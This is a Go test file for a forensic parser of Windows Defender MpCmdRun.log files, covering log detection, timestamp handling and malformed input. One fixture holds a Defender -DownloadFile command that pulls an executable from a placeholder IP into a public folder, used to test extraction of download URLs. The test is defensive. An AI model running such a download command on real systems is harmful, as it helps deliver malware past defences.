package defendercmd

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf16"

	"tracefall/internal/model"
	"tracefall/internal/parsers"
)

const lrm = "\u200e"

func utf16File(t *testing.T, name, text string) string {
	t.Helper()
	u := utf16.Encode([]rune(text))
	b := []byte{0xff, 0xfe}
	for _, c := range u {
		b = append(b, byte(c), byte(c>>8))
	}
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, b, 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func block(cmd, start, end string, body ...string) string {
	s := "\r\n-------------------------------------------------------------------------------------\r\n" +
		"MpCmdRun: Command Line: " + cmd + "\r\n" +
		" Start Time: " + lrm + strings.ReplaceAll(start, " ", " "+lrm) + "\r\n\r\n"
	for _, l := range body {
		s += l + "\r\n"
	}
	if end != "" {
		s += "MpCmdRun: End Time: " + lrm + strings.ReplaceAll(end, " ", " "+lrm) + "\r\n"
	}
	return s + "-------------------------------------------------------------------------------------\r\n"
}

const exe = `"C:\Program Files\Windows Defender\MpCmdRun.exe"`

func TestDetect_ByNameAndContent(t *testing.T) {
	p := New()
	for _, ok := range []string{"MpCmdRun.log", "mpcmdrun.LOG", "MpCmdRun-20260105-091500.log", `C:\Windows\Temp\MpCmdRun.log`} {
		if !p.Detect(ok) {
			t.Errorf("Detect(%q) = false", ok)
		}
	}
	for _, no := range []string{"MpCmdRun.exe", "MpCmdRun.log.gz", "MpCmdRun.txt", "mplog-20260105.log", "xMpCmdRun.log"} {
		if p.Detect(no) {
			t.Errorf("Detect(%q) = true", no)
		}
	}
	good := []byte{0xff, 0xfe}
	for _, c := range utf16.Encode([]rune("\r\n-----\r\nMpCmdRun: Command Line: x\r\n")) {
		good = append(good, byte(c), byte(c>>8))
	}
	if !p.DetectContent(good) || !p.ConfirmContent(good) {
		t.Error("a UTF-16 log that opens with the tool's own line should be recognised")
	}
	if p.DetectContent([]byte("MpCmdRun: Command Line: but in plain text\n")) {
		t.Error("only the UTF-16 form the tool writes is claimed by content")
	}
}

func TestParse_OneEventPerRunWithItsCommandAndLocalTimes(t *testing.T) {
	text := block(exe+" SignatureUpdate -ScheduleJob -RestrictPrivileges", "Mon Jan 05 2026 09:04:37", "Mon Jan 05 2026 09:04:41",
		"MpEnsureProcessMitigationPolicy: hr = 0x1", "Update completed with hr: 0x00000000") +
		block(exe+" -DownloadFile -url http://198.51.100.7/x.exe -path C:\\Users\\Public\\x.exe", "Mon Jan 05 2026 13:10:00", "Mon Jan 05 2026 13:10:01",
			"ERROR: DownloadFile failed with hr=0x80070005")
	res, err := New().Parse(utf16File(t, "MpCmdRun.log", text))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 2 || len(res.Raw) != 2 {
		t.Fatalf("events %d raw %d", len(res.Events), len(res.Raw))
	}
	e := res.Events[0]
	if e.EventType != model.EventDefenderCommand || e.ArtifactType != model.ArtifactDefenderCmdLog {
		t.Errorf("types %s %s", e.EventType, e.ArtifactType)
	}
	if !e.Timestamp.IsZero() {
		t.Errorf("a local reading with no recorded zone must not become an instant: %v", e.Timestamp)
	}
	for k, want := range map[string]string{
		"command_line": exe + " SignatureUpdate -ScheduleJob -RestrictPrivileges", "verb": "SignatureUpdate",
		"timestamp_local": "2026-01-05T09:04:37", "end_local": "2026-01-05T09:04:41",
		"timestamp_basis": "local time; offset not recorded", "line_number": "3",
	} {
		if e.Extra[k] != want {
			t.Errorf("Extra[%s] = %q, want %q", k, e.Extra[k], want)
		}
	}
	d := res.Events[1]
	if d.Extra["verb"] != "-DownloadFile" || d.Extra["download_url"] != "http://198.51.100.7/x.exe" || d.Extra["download_path"] != `C:\Users\Public\x.exe` {
		t.Errorf("%v", d.Extra)
	}
	if !strings.Contains(d.Extra["error_lines"], "0x80070005") {
		t.Errorf("a line that reports an error must be kept: %q", d.Extra["error_lines"])
	}
	if strings.Contains(e.Extra["error_lines"], "hr: 0x00000000") || e.Extra["error_lines"] != "" {
		t.Errorf("a successful run reports no errors: %q", e.Extra["error_lines"])
	}
	if res.Events[0].SourceReference == res.Events[1].SourceReference {
		t.Error("each run needs its own reference")
	}
}

func TestParse_UTCOnlyWhenTheCollectionRecordsItsZone(t *testing.T) {
	text := block(exe+" -RestartService", "Mon Jan 05 2026 09:04:37", "Mon Jan 05 2026 09:04:38")
	p := utf16File(t, "MpCmdRun.log", text)
	res, _ := New().ParseWithContext(p, parsers.ParseContext{TimeBasis: &parsers.TimeBasis{ActiveBiasMinutes: -180, Source: "SYSTEM hive TimeZoneInformation ActiveTimeBias"}})
	e := res.Events[0]
	if e.Extra["timestamp_utc"] != "2026-01-05T06:04:37Z" {
		t.Errorf("utc = %q (bias -180 means local is UTC+3)", e.Extra["timestamp_utc"])
	}
	if !strings.Contains(e.Extra["timestamp_utc_basis"], "SYSTEM hive") || !strings.Contains(e.Extra["timestamp_utc_basis"], "daylight") {
		t.Errorf("the basis and its limit must be stated: %q", e.Extra["timestamp_utc_basis"])
	}
	if !e.Timestamp.IsZero() {
		t.Errorf("the event instant stays unset, as for other local readings")
	}
	res2, _ := New().Parse(p)
	if _, ok := res2.Events[0].Extra["timestamp_utc"]; ok {
		t.Error("without a recorded zone there must be no UTC")
	}
}

func TestParse_RunWithoutAnEndAndUnreadableTimes(t *testing.T) {
	text := block(exe+" -Scan -ScanType 1", "Mon Jan 05 2026 09:04:37", "") +
		block(exe+" -Scan", "lun. janv. 05 2026 09:04:37", "")
	res, err := New().Parse(utf16File(t, "MpCmdRun.log", text))
	if err != nil || len(res.Events) != 2 {
		t.Fatalf("%v %d", err, len(res.Events))
	}
	if _, ok := res.Events[0].Extra["end_local"]; ok {
		t.Error("a run with no End Time line has no end")
	}
	if res.Events[1].Extra["timestamp_local"] != "" || res.Events[1].Extra["timestamp_text"] == "" {
		t.Errorf("a time in a language this parser does not read stays as written, not guessed: %v", res.Events[1].Extra)
	}
}

func TestParse_HostileInput(t *testing.T) {
	if _, err := New().Parse(utf16File(t, "MpCmdRun.log", strings.Repeat("MpCmdRun: Command Line: "+strings.Repeat("A", 100000)+"\r\n", 3))); err != nil {
		t.Fatal(err)
	}
	odd := filepath.Join(t.TempDir(), "MpCmdRun.log")
	os.WriteFile(odd, []byte{0xff, 0xfe, 'M', 0, 'p'}, 0o600) // odd length
	if _, err := New().Parse(odd); err != nil {
		t.Fatalf("a cut file must not fail the import: %v", err)
	}
	res, _ := New().Parse(utf16File(t, "MpCmdRun.log", block(strings.Repeat("x", 50000), "Mon Jan 05 2026 09:04:37", "")))
	if len(res.Events) != 1 || len(res.Events[0].Extra["command_line"]) > 4200 {
		t.Errorf("command line must be bounded")
	}
	_ = time.Now
}

func TestParse_TheFirstStartTimeOfARunIsTheRunsStart(t *testing.T) {
	text := block(exe+" -Scan", "Mon Jan 05 2026 09:04:37", "Mon Jan 05 2026 09:09:00",
		" Start Time: "+lrm+"Mon "+lrm+"Jan "+lrm+"05 "+lrm+"2026 "+lrm+"09:07:00")
	res, _ := New().Parse(utf16File(t, "MpCmdRun.log", text))
	if got := res.Events[0].Extra["timestamp_local"]; got != "2026-01-05T09:04:37" {
		t.Errorf("a later Start Time line replaced the first: %s", got)
	}
}
